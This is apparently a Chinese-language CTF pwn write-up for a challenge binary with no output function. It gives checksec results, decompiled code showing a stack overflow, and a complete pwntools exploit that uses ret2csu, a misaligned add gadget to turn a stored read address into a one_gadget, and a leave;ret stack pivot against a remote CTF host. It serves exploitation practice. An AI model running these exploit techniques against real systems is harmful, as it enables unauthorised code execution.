1. checksec

   ```
   ┌──(root㉿kali)-[/home/kali/Desktop/newstar_no_output]
   └─# checksec ./pwn   
   [*] '/home/kali/Desktop/newstar_no_output/pwn'
       Arch:     amd64-64-little
       RELRO:    Full RELRO
       Stack:    No canary found
       NX:       NX enabled
       PIE:      No PIE (0x3ff000)

   ```
2. IDA

   ```
   int __cdecl main(int argc, const char **argv, const char **envp)
   {
     char buf[112]; // [rsp+0h] [rbp-70h] BYREF

     init(argc, argv, envp);
     read(0, buf, 0x200uLL);
     a = (__int64)&read;
     return 0;
   }
   ```

   没有调用过输出函数，但是可以知道变量a是read的地址，利用只能通过相对于read的偏移来利用
3. exp：

   看别人的wp才知道，在0x040112c处有 `add    DWORD PTR [rbp-0x3d], ebx`，是通过将前一个汇编拆分，和下一条汇编代码汇总得到的。题干中给了libc文件，即可以得到one_gadget相对于read的偏移，如果rbp=a+0x3d，ebx等于这个偏移量，执行这条汇编指令的时候就可以将变量a改为one_gadget的绝对地址。

   通过csu，控制rbp和rbx，实现上面的步骤，再利用leave_ret将栈迁移到a-0x8处，pop rbp，ret（pop rip）将rip指向one_gadget。

   ```
   from pwn import *

   context(log_level='debug',arch='amd64',os='linux')

   # io = process('/home/kali/Desktop/newstar_no_output/pwn')
   io = remote("node5.buuoj.cn",29172)
   # io = gdb.debug('/home/kali/Desktop/newstar_no_output/pwn','b *main')

   rbp_0x3_add_ret = 0x040112c #01 5d c3    add    DWORD PTR [rbp-0x3d], ebx
   pop_rdi_ret =  0x401253
   csu_init = 0x40124A
   a = 0x404050
   leave_ret = 0x4011EA

   one_gadget = 0xe3afe
   # one_gadget = 0xe3b01
   # one_gadget = 0xe3b04

   read_rel_adress = 0x10DFC0 # 0x7ffff7ee2fc0 - 0x7ffff7dd5000

   number = one_gadget-read_rel_adress
   # number = struct.pack("<q", number)
   print(hex(number))

   payload = b'a' * 120
   payload += p64(csu_init) + b'\x3e\x5b\xfd\xff\x3e\x5b\xfd\xff' + p64(a+0x3d) + p64(0) + p64(0) + p64(0) + p64(0)
   payload += p64(rbp_0x3_add_ret) + p64(0x40124B) + p64(a - 0x8) + p64(0) + p64(0) + p64(0) + p64(0)
   payload += p64(leave_ret)

   io.send(payload)
   # gdb.attach(io)
   io.interactive()
   ```
